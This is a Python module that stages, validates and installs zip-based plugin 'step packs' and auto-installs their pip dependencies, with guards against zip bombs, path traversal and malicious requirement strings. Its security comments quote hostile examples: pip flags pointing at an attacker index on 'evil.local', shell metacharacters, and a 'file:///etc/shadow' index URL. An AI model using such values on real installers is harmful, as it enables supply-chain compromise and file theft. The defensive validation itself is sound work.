"""Step-pack lifecycle management.

A step pack is a `.dpack` archive (zip) with this layout:

    statspack-1.0.0.dpack
    └── statspack/
        ├── pack.json
        ├── README.md
        ├── LICENSE
        └── steps/
            ├── t_test/
            │   ├── manifest.json
            │   └── step.py
            └── …

This module handles **everything between the upload and the StepRegistry
re-scan**: extracting the archive into a staged area, validating its
manifest + member layout, computing conflict reports, and ultimately
moving an approved pack into `<repo>/plugins/packs/<pack_id>/`.

Steps inside a pack live at `<repo>/plugins/packs/<id>/steps/<step_id>/`.
The StepRegistry's pack-aware scan walks every installed pack's `steps/`
directory; see `dig.engine.registry`.

The two-step "stage → install" model mirrors the existing AI-generated
plugin path so the mental model stays unified: upload first, review the
manifest in a dialog, then explicitly accept.
"""
from __future__ import annotations

import hashlib
import io
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

log = logging.getLogger(__name__)

from jsonschema import Draft202012Validator

# ── Path roots ──────────────────────────────────────────────────────

# `parents[3]` resolves backend/dig/plugins/packs.py → repo root.
_REPO_ROOT = Path(__file__).resolve().parents[3]
_SCHEMAS_DIR = _REPO_ROOT / "shared" / "schemas"

PACKS_DIR = _REPO_ROOT / "plugins" / "packs"
PENDING_PACKS_DIR = _REPO_ROOT / "plugins" / "_pending" / "packs"


_ID_RE = re.compile(r"^[a-z][a-z0-9_]*$")
_SEMVER_RE = re.compile(r"^\d+\.\d+\.\d+$")
_MAX_ARCHIVE_BYTES = 50 * 1024 * 1024            # 50 MB hard ceiling
_MAX_TOTAL_UNCOMPRESSED = 200 * 1024 * 1024      # zip-bomb guard
_ALLOWED_EXTENSIONS = {".json", ".py", ".md", ".txt", ".rst"}
# files allowed at the pack root (not inside steps/, connectors/, etc.)
_ROOT_ALLOWED = {"pack.json", "README.md", "LICENSE", "LICENSE.md", "LICENSE.txt", "CHANGELOG.md"}


class PackError(Exception):
    """Anything wrong with a pack archive — bad structure, schema, conflict."""


@dataclass
class PackConflict:
    step_id: str
    existing_source: str  # "builtin" | "pack:<id>" | "plugin"


@dataclass
class StagedPack:
    """Result of a successful upload-and-stage pass.

    Carries enough metadata for the install dialog to render without
    touching the filesystem again. The pack content itself lives at
    `_PENDING_DIR / id_with_version`.
    """
    pack_id: str
    version: str
    label: str
    description: str
    license: str | None
    author: str | None
    homepage: str | None
    readme: str | None
    steps: list[str]
    connectors: list[str]
    python_requirements: list[str]
    declared_checksum: str | None
    computed_checksum: str
    pending_dir: Path
    conflicts: list[PackConflict]


# ── Validators (loaded lazily so import is cheap) ──────────────────

_pack_validator: Draft202012Validator | None = None
_step_validator: Draft202012Validator | None = None


def _validator(schema_name: str) -> Draft202012Validator:
    path = _SCHEMAS_DIR / schema_name
    if not path.exists():
        raise PackError(f"schema not found: {path}")
    return Draft202012Validator(json.loads(path.read_text()))


def _pack_v() -> Draft202012Validator:
    global _pack_validator
    if _pack_validator is None:
        _pack_validator = _validator("pack-manifest.schema.json")
    return _pack_validator


def _step_v() -> Draft202012Validator:
    global _step_validator
    if _step_validator is None:
        _step_validator = _validator("step-manifest.schema.json")
    return _step_validator


# ── Path safety + identifier validation ────────────────────────────


def _validate_id(pack_id: Any, label: str = "pack id") -> str:
    if not isinstance(pack_id, str) or not pack_id:
        raise PackError(f"{label} must be a non-empty string")
    if len(pack_id) > 40:
        raise PackError(f"{label} too long (max 40 chars)")
    if not _ID_RE.match(pack_id):
        raise PackError(f"invalid {label}: {pack_id!r} — must be snake_case (a-z 0-9 _ only, lead with letter)")
    return pack_id


def _safe_member_path(name: str) -> bool:
    """Reject zip member paths that try to escape the pack root."""
    if name.startswith("/") or name.startswith("\\"):
        return False
    parts = name.replace("\\", "/").split("/")
    if any(p in (".", "..", "") for p in parts[:-1]):
        return False
    return True


# ── Upload + extraction ────────────────────────────────────────────


def stage_pack(archive_bytes: bytes, source_url: str | None = None) -> StagedPack:
    """Extract a `.dpack` upload into the pending area; validate; report.

    The archive is materialised under
    `<repo>/plugins/_pending/packs/<id>-<version>/` so that an operator
    can review it (or another process can lint it) before we move the
    files into the installed area. No StepRegistry rescan happens here.

    Raises PackError if the archive is malformed; never touches PACKS_DIR
    until `install_staged()` is called separately.
    """
    if len(archive_bytes) > _MAX_ARCHIVE_BYTES:
        raise PackError(f"archive too large: {len(archive_bytes):,} bytes (max {_MAX_ARCHIVE_BYTES:,})")

    # First, peek at the archive to find pack.json before extracting.
    try:
        zf = zipfile.ZipFile(io.BytesIO(archive_bytes))
    except zipfile.BadZipFile as e:
        raise PackError(f"not a valid zip archive: {e}") from e

    # Determine the single top-level directory inside the archive.
    top_levels = {p.split("/")[0] for p in zf.namelist() if "/" in p or not p.endswith("/")}
    top_levels = {t for t in top_levels if t}
    if len(top_levels) != 1:
        raise PackError(
            f"archive must contain exactly one top-level directory; found {sorted(top_levels)}",
        )
    pack_id = _validate_id(next(iter(top_levels)))

    # Read pack.json from the archive without extracting.
    pack_json_member = f"{pack_id}/pack.json"
    if pack_json_member not in zf.namelist():
        raise PackError(f"missing {pack_json_member} in archive")
    try:
        pack_doc = json.loads(zf.read(pack_json_member).decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        raise PackError(f"pack.json is not valid UTF-8 JSON: {e}") from e

    errors = sorted(_pack_v().iter_errors(pack_doc), key=lambda e: list(e.path))
    if errors:
        msgs = "; ".join(f"{'/'.join(str(p) for p in e.path) or '<root>'}: {e.message}" for e in errors)
        raise PackError(f"pack.json schema invalid: {msgs}")
    if pack_doc["id"] != pack_id:
        raise PackError(
            f"pack.json:id ({pack_doc['id']!r}) does not match top-level dir ({pack_id!r})",
        )
    version = pack_doc["version"]
    if not _SEMVER_RE.match(version):
        raise PackError(f"pack.json:version not semver: {version!r}")

    # Materialise extraction target. Use id+version so two pending uploads
    # of the same pack at different versions don't collide.
    pending_dir = PENDING_PACKS_DIR / f"{pack_id}-{version}"
    if pending_dir.exists():
        shutil.rmtree(pending_dir)
    pending_dir.mkdir(parents=True, exist_ok=True)

    # Extract with a guard against zip-bombs and traversal.
    total = 0
    for info in zf.infolist():
        if info.is_dir():
            continue
        member = info.filename
        if not _safe_member_path(member):
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"unsafe archive member: {member!r}")
        # Only allow files inside the declared top-level dir.
        if not member.startswith(f"{pack_id}/"):
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"member outside pack root: {member!r}")
        # File-extension guard. Allow LICENSE etc. with no extension.
        rel = Path(member).relative_to(pack_id)
        suffix = rel.suffix.lower()
        if suffix and suffix not in _ALLOWED_EXTENSIONS:
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"disallowed file extension: {member!r}")
        # Total size guard
        total += info.file_size
        if total > _MAX_TOTAL_UNCOMPRESSED:
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"archive uncompressed size exceeds {_MAX_TOTAL_UNCOMPRESSED:,} bytes")
        # Extract
        target = pending_dir / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        with zf.open(info) as src, open(target, "wb") as dst:
            shutil.copyfileobj(src, dst)

    # Now that the pack is on disk, validate per-step manifests.
    declared_steps = list(pack_doc.get("steps") or [])
    declared_connectors = list(pack_doc.get("connectors") or [])

    steps_root = pending_dir / "steps"
    if declared_steps and not steps_root.exists():
        shutil.rmtree(pending_dir, ignore_errors=True)
        raise PackError("pack.json declares steps but no steps/ directory in archive")

    on_disk_steps = sorted(d.name for d in steps_root.iterdir() if d.is_dir()) if steps_root.exists() else []
    declared_set = set(declared_steps)
    on_disk_set = set(on_disk_steps)
    if declared_set != on_disk_set:
        missing = declared_set - on_disk_set
        extra = on_disk_set - declared_set
        shutil.rmtree(pending_dir, ignore_errors=True)
        raise PackError(
            f"steps/ ↔ pack.json:steps[] mismatch: missing on disk {sorted(missing)}, "
            f"undeclared on disk {sorted(extra)}",
        )

    for sid in declared_steps:
        _validate_id(sid, "step id")
        manifest_path = steps_root / sid / "manifest.json"
        if not manifest_path.exists():
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"missing manifest.json for step {sid}")
        try:
            step_manifest = json.loads(manifest_path.read_text())
        except json.JSONDecodeError as e:
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"steps/{sid}/manifest.json is not valid JSON: {e}") from e
        s_errors = sorted(_step_v().iter_errors(step_manifest), key=lambda e: list(e.path))
        if s_errors:
            msgs = "; ".join(f"{'/'.join(str(p) for p in e.path) or '<root>'}: {e.message}" for e in s_errors)
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"steps/{sid}/manifest.json invalid: {msgs}")
        if step_manifest.get("id") != sid:
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(
                f"steps/{sid}/manifest.json:id ({step_manifest.get('id')!r}) != folder name ({sid!r})",
            )
        # step.py exists (we don't import — that's the registry's job)
        if not (steps_root / sid / "step.py").exists():
            shutil.rmtree(pending_dir, ignore_errors=True)
            raise PackError(f"missing steps/{sid}/step.py")

    # Compute the same checksum the build script does — so the install
    # registry can later verify against the declared `checksum`.
    computed_checksum = _compute_pack_checksum(pending_dir)

    # Compute conflicts against the live StepRegistry.
    conflicts = _detect_conflicts(declared_steps)

    # Try to read README for the install dialog.
    readme_text: str | None = None
    for candidate in ("README.md", "Readme.md", "readme.md"):
        path = pending_dir / candidate
        if path.exists():
            try:
                readme_text = path.read_text(encoding="utf-8")[:32_000]
            except UnicodeDecodeError:
                pass
            break

    return StagedPack(
        pack_id=pack_id,
        version=version,
        label=str(pack_doc["label"]),
        description=str(pack_doc["description"]),
        license=pack_doc.get("license"),
        author=pack_doc.get("author"),
        homepage=pack_doc.get("homepage"),
        readme=readme_text,
        steps=declared_steps,
        connectors=declared_connectors,
        python_requirements=list(pack_doc.get("pythonRequirements") or []),
        declared_checksum=pack_doc.get("checksum"),
        computed_checksum=computed_checksum,
        pending_dir=pending_dir,
        conflicts=conflicts,
    )


@dataclass
class InstallResult:
    """Outcome of an install_staged call.

    `dep_install` is None when the pack declared no pythonRequirements OR
    auto-install is disabled via DIG_PACK_AUTO_INSTALL_DEPS=0.
    """
    install_dir: Path
    dep_install: "DepInstallResult | None" = None


@dataclass
class DepInstallResult:
    requirements: list[str]
    success: bool
    output: str           # combined pip stdout + stderr (capped)
    elapsed_sec: float
    skipped_reason: str | None = None


def _auto_install_enabled() -> bool:
    """Allow operators to opt out via env var. Default: enabled.

    Set DIG_PACK_AUTO_INSTALL_DEPS=0 (or 'false' / 'no' / 'off') to keep
    the legacy behaviour where pip is the operator's responsibility.
    """
    raw = os.environ.get("DIG_PACK_AUTO_INSTALL_DEPS", "1").strip().lower()
    return raw not in ("0", "false", "no", "off", "")


# Strict PEP 508 subset. Allows `name`, `name[extra1,extra2]`, version
# specifiers, and (whitespace-stripped) environment markers — but NOT:
#   - flags (`--index-url evil.com/pypi`, `-r req.txt`, `-e .`)
#   - URL/VCS installs (`git+https://`, `pkg @ https://wheel`, `./local`)
#   - shell metacharacters (`;`, `&&`, `|`, backticks, `$()`)
#   - paths (any `/` or `\\`)
# This is the round-4 SEC-1 fix: the manifest schema previously accepted
# any non-empty string and `subprocess.run([..., *requirements])` shelled
# them straight to pip, so a malicious `pythonRequirements` like
# `["--index-url=https://evil.local/pypi", "innocent_pkg"]` would silently
# pivot pip to the attacker's index. Reject anything that isn't a
# project-name + optional extras + optional version-specifier + optional
# environment marker.
_REQ_RE = re.compile(
    r"""^
    [A-Za-z][A-Za-z0-9._-]{0,63}                       # PEP 503 normalized name
    (?:\[[A-Za-z0-9_,\-\s]{1,80}\])?                   # optional extras
    (?:\s*(?:==|!=|<=|>=|<|>|~=|===)\s*               # optional version spec
       [A-Za-z0-9._\-\+\*]{1,64}
       (?:\s*,\s*(?:==|!=|<=|>=|<|>|~=|===)\s*
          [A-Za-z0-9._\-\+\*]{1,64})*
    )?
    (?:\s*;\s*[A-Za-z0-9_\s.<>=!'"\(\)\-]{1,160})?    # optional env marker
    \s*$
    """,
    re.VERBOSE,
)
_REQ_DENY_CHARS = ("/", "\\", "@", "`", "$", "\n", "\r", "\t", "\x00")


def _validate_requirement(raw: str) -> str:
    """Reject anything that isn't a plain `name[extras][specifier][;marker]`.

    Defense-in-depth around the JSON schema (which we also tighten). Even
    if a future schema change loosens the regex, the installer refuses to
    pass argv that could pivot pip to a malicious index, install a remote
    wheel URL, or run arbitrary shell commands.
    """
    if not isinstance(raw, str) or not raw.strip():
        raise PackError("pythonRequirement entry must be a non-empty string")
    s = raw.strip()
    if len(s) > 200:
        raise PackError(f"pythonRequirement too long (>200 chars): {s[:60]}…")
    if s.startswith("-"):
        raise PackError(
            f"pythonRequirement may not start with '-' (no pip flags allowed): {s!r}",
        )
    for ch in _REQ_DENY_CHARS:
        if ch in s:
            raise PackError(
                f"pythonRequirement contains forbidden character {ch!r} "
                f"(URL/VCS/path/shell installs are not allowed): {s!r}",
            )
    if not _REQ_RE.match(s):
        raise PackError(
            f"pythonRequirement {s!r} is not a valid name[extras][specifier] string. "
            "URL, VCS (git+/hg+), local-path, and pip-flag forms are rejected.",
        )
    return s


def _install_python_deps(requirements: list[str], timeout: int = 300) -> DepInstallResult:
    """Run `pip install` for the given requirements in the host's Python env.

    Uses `sys.executable -m pip install --upgrade` so we're guaranteed to
    install into the same interpreter that's loading the pack's step.py
    files. Output is captured (combined stdout+stderr) and capped at 8 KB
    so a noisy resolver run doesn't blow up the response payload.

    Note: this *is* a deliberate trust escalation — packs ship code +
    declare deps, and we now do both. The install dialog must surface
    what was installed; the operator opts in by clicking Install.
    """
    import time
    if not requirements:
        return DepInstallResult(requirements=[], success=True, output="", elapsed_sec=0.0)

    # Hard-reject anything outside the allowed PEP 508 subset before we
    # hand argv to pip. Without this, pythonRequirements is a
    # remote-code-execution sink — see _validate_requirement docstring.
    try:
        validated = [_validate_requirement(r) for r in requirements]
    except PackError as e:
        return DepInstallResult(
            requirements=requirements,
            success=False,
            output=f"refused to install: {e}",
            elapsed_sec=0.0,
        )

    # Pin to the public PyPI index unless the operator explicitly
    # overrides via DIG_PIP_INDEX_URL. Without an explicit --index-url
    # pip honours $PIP_INDEX_URL / $PIP_EXTRA_INDEX_URL from the
    # environment, which an attacker who can set env can use to redirect
    # the install. `--isolated` strips pip's own config files / env vars
    # for the same reason; `--no-input` makes the call non-interactive
    # so a "do you trust this URL?" prompt can't hang the request.
    # Pen-tester defence-in-depth: validate the index-url scheme so a hostile
    # operator-set value like `file:///etc/shadow` or `http://internal/...`
    # can't redirect pip into reading local files / pivoting through the LAN.
    # Only http(s) accepted.
    index_url = os.environ.get("DIG_PIP_INDEX_URL", "https://pypi.org/simple/")
    from urllib.parse import urlparse as _urlparse
    _parsed_index = _urlparse(index_url)
    if _parsed_index.scheme not in ("http", "https") or not _parsed_index.netloc:
        raise RuntimeError(
            f"DIG_PIP_INDEX_URL must be an http(s) URL with a host; "
            f"got {index_url!r}",
        )
    cmd = [
        sys.executable, "-m", "pip", "install",
        "--upgrade",
        "--disable-pip-version-check",
        "--isolated",
        "--no-input",
        "--index-url", index_url,
        # `--` ends pip's option parsing — even if a future change to
        # _REQ_RE accidentally allowed a leading `-`, pip would treat
        # the value as a positional requirement and fail-closed instead
        # of consuming it as a flag.
        "--",
    ]
    cmd.extend(validated)
    log.info("pack auto-install: %s", " ".join(cmd))
    started = time.monotonic()
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as e:
        return DepInstallResult(
            requirements=requirements,
            success=False,
            output=f"pip install timed out after {timeout}s\n{e.stdout or ''}\n{e.stderr or ''}",
            elapsed_sec=time.monotonic() - started,
        )
    output = (proc.stdout or "") + (proc.stderr or "")
    if len(output) > 8000:
        output = output[:4000] + "\n…\n[truncated]\n…\n" + output[-3500:]
    return DepInstallResult(
        requirements=requirements,
        success=proc.returncode == 0,
        output=output.strip(),
        elapsed_sec=time.monotonic() - started,
    )


def install_staged(pack_id: str, version: str) -> InstallResult:
    """Move staged files into the installed area; auto-install Python deps.

    Caller is responsible for reflecting the new state in the StepPack
    table and triggering a StepRegistry rebuild. This function handles
    the filesystem move + (when enabled) the pip install.

    Returns an InstallResult; check `dep_install.success` if you care
    about whether dependencies actually resolved. The install proceeds
    even if pip fails, so the operator can fix things (e.g. set up a
    private index) and re-run the deps installer separately.
    """
    _validate_id(pack_id)
    pending_dir = PENDING_PACKS_DIR / f"{pack_id}-{version}"
    if not pending_dir.exists():
        raise PackError(f"no staged pack for {pack_id} v{version}")

    # Read manifest for the requirements before the move, so we don't
    # have to re-validate on the new path.
    manifest = read_pack_manifest(pending_dir)
    requirements = list(manifest.get("pythonRequirements") or [])

    install_dir = PACKS_DIR / pack_id
    if install_dir.exists():
        shutil.rmtree(install_dir)
    install_dir.parent.mkdir(parents=True, exist_ok=True)
    pending_dir.rename(install_dir)

    dep_result: DepInstallResult | None = None
    if requirements:
        if _auto_install_enabled():
            dep_result = _install_python_deps(requirements)
        else:
            dep_result = DepInstallResult(
                requirements=requirements,
                success=False,
                output="",
                elapsed_sec=0.0,
                skipped_reason=(
                    "auto-install disabled (DIG_PACK_AUTO_INSTALL_DEPS=0); "
                    "run `pip install " + " ".join(requirements) + "` manually"
                ),
            )
    return InstallResult(install_dir=install_dir, dep_install=dep_result)


def discard_staged(pack_id: str, version: str) -> None:
    """Drop a staged pending pack without installing."""
    _validate_id(pack_id)
    pending_dir = PENDING_PACKS_DIR / f"{pack_id}-{version}"
    if pending_dir.exists():
        shutil.rmtree(pending_dir)


def uninstall_pack(pack_id: str) -> None:
    """Remove an installed pack from disk. Caller updates the DB row."""
    _validate_id(pack_id)
    install_dir = PACKS_DIR / pack_id
    if install_dir.exists():
        shutil.rmtree(install_dir)


# ── Helpers ────────────────────────────────────────────────────────


def _compute_pack_checksum(pack_dir: Path) -> str:
    """Compute a content checksum over the pack's *payload*.

    `pack.json` is metadata — it carries the checksum itself, so we
    can't include it in the hash without a chicken-and-egg cycle. The
    payload (everything else: steps/, connectors/, README, LICENSE …)
    is what makes the pack functionally "the same"; that's what we
    hash.

    Same algorithm both sides:
        for each file under pack_dir, sorted by `<id>/<rel>` path:
          h.update(path.encode("utf-8"))
          h.update(b"\\x00")
          h.update(file_bytes)
    """
    pack_json_path = pack_dir / "pack.json"
    if pack_json_path.exists():
        pack_id = json.loads(pack_json_path.read_text())["id"]
    else:
        pack_id = pack_dir.name.split("-")[0]

    members: list[tuple[Path, str]] = []
    for src in sorted(pack_dir.rglob("*")):
        if src.is_dir():
            continue
        rel = src.relative_to(pack_dir)
        # Skip metadata + editor / OS detritus
        if rel.as_posix() == "pack.json":
            continue
        if any(part in {"__pycache__", ".DS_Store", ".pytest_cache"} for part in rel.parts):
            continue
        if rel.name.endswith((".pyc", ".pyo")):
            continue
        members.append((src, f"{pack_id}/{rel.as_posix()}"))

    members.sort(key=lambda m: m[1])
    h = hashlib.sha256()
    for src, archive_name in members:
        h.update(archive_name.encode("utf-8"))
        h.update(b"\x00")
        h.update(src.read_bytes())
    return "sha256:" + h.hexdigest()


def _detect_conflicts(declared_steps: list[str]) -> list[PackConflict]:
    """Cross-reference incoming step IDs against the live StepRegistry.

    Returns conflicts in priority order: builtin first (always blocking),
    then other packs, then plugins. The caller decides how to surface
    them; this module never silently overrides anything.
    """
    # Lazy import to avoid registry initialisation at module load time.
    try:
        from dig.engine.registry import steps as step_registry
    except Exception:
        return []
    try:
        existing = step_registry()
    except Exception:
        return []
    conflicts: list[PackConflict] = []
    for sid in declared_steps:
        try:
            s = existing.get(sid)
        except KeyError:
            continue
        # The registry doesn't currently track source — for now we mark
        # everything as "existing". When the registry gains a `source`
        # attribute, surface it here.
        conflicts.append(PackConflict(step_id=sid, existing_source=getattr(s, "source", "existing")))
    return conflicts


def list_installed_pack_dirs() -> list[Path]:
    """Disk listing — what's currently in plugins/packs/. Skips `_*` and `.*`."""
    if not PACKS_DIR.exists():
        return []
    return sorted(
        d for d in PACKS_DIR.iterdir()
        if d.is_dir() and not d.name.startswith(("_", "."))
    )


def read_pack_manifest(pack_dir: Path) -> dict[str, Any]:
    """Read pack.json from an installed pack dir. Raises if missing/invalid."""
    p = pack_dir / "pack.json"
    if not p.exists():
        raise PackError(f"pack.json not found in {pack_dir}")
    doc = json.loads(p.read_text())
    errors = sorted(_pack_v().iter_errors(doc), key=lambda e: list(e.path))
    if errors:
        msgs = "; ".join(f"{'/'.join(str(p) for p in e.path) or '<root>'}: {e.message}" for e in errors)
        raise PackError(f"pack.json invalid: {msgs}")
    return doc


